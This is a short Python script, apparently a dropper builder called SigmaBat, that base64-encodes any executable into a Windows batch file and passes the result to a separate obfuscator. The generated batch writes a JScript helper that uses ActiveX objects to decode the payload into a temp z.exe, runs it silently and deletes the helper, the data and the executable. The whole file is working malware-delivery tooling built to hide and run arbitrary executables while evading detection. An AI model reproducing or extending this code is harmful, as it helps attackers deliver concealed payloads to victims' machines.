import base64
import sys
import os
import subprocess

def main():
    if len(sys.argv) < 3:
        print("Usage: SigmaBat.py <input exe> <output bat>")
        sys.exit(1)

    tog1 = sys.argv[1]
    tog2 = sys.argv[2]

    try:
        with open(tog1, 'rb') as exe_file:
            exe_content = exe_file.read()
    except FileNotFoundError:
        print(f"File not found: {tog1}")
        sys.exit(1)

    base64_encoded = base64.b64encode(exe_content)

    def create_bat_file(long_string, output_file):
        efif = 'set "START_PATH=%cd%"\ncd %temp%\nC:\n'
        efif2 = (
            'echo f=new ActiveXObject(^"Scripting.FileSystemObject^");'
            'i=f.getFile(^"x^").openAsTextStream();>p.js\n'
            'echo x=new ActiveXObject(^"MSXml2.DOMDocument^").createElement(^"Base64Data^");'
            'x.dataType=^"bin.base64^";>>p.js\n'
            'echo x.text=i.readAll();o=new ActiveXObject(^"ADODB.Stream^");o.type=1;o.open();'
            'o.write(x.nodeTypedValue);>>p.js\n'
            'echo z=f.getAbsolutePathName(^"z.exe^");o.saveToFile(z);'
            's=new ActiveXObject(^"Shell.Application^");>>p.js\n'
            'echo s.namespace(26).copyHere(s.namespace(z).items());'
            'o.close();i.close();>>p.js\n'
            'cscript p.js >NUL 2>NUL\n'
            'del /q p.js\n'
            'del /q x\n'
            'call z.exe\n'
            'del z.exe\n'
            'cd /d "%START_PATH%"'
        )

        with open(output_file, 'w') as bat_file:
            bat_file.write(f'@echo off\n{efif}')
            for i in range(0, len(long_string), 77):
                line = long_string[i:i+77]
                bat_file.write(f'echo {line.decode("utf-8")} >> x\n')
            bat_file.write(efif2)

    create_bat_file(base64_encoded, tog2)

    # Запуск obfuscate.py с созданным .bat файлом
    try:
        result = subprocess.run(['python', 'obfuscator.py', tog2], check=True, capture_output=True, text=True)
    except subprocess.CalledProcessError as e:
        print(f"Error during obfuscation: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
